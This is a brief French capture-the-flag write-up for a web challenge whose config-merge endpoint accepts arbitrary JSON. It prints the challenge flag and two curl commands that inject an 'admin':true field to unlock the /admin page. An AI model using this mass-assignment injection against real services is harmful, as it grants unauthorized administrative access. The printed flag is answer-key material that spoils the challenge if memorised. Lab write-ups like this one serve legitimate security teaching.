# boazak--kande (web / config merge, id 460)

**Flag (finale) :** `NCTF{5cccbb9757646180a674d2c3}`

## Contexte
Kandé Config : `POST /api/config` fusionne ton JSON dans la configuration.
`GET /admin` n'est accessible que si `admin` vaut `true` dans la config.

## Faille
Fusion non filtrée (merge) → on ajoute `admin:true` à la config persistée (session).

## Exploitation
```bash
J=cookies
curl -s -c $J -b $J $B/api/config -H 'Content-Type: application/json' -d '{"admin":true}'
# {"message":"Configuration fusionnée","settings":{"theme":"dark","admin":true}}
curl -s -c $J -b $J $B/admin      # -> {"flag":"NCTF{...}"}
```
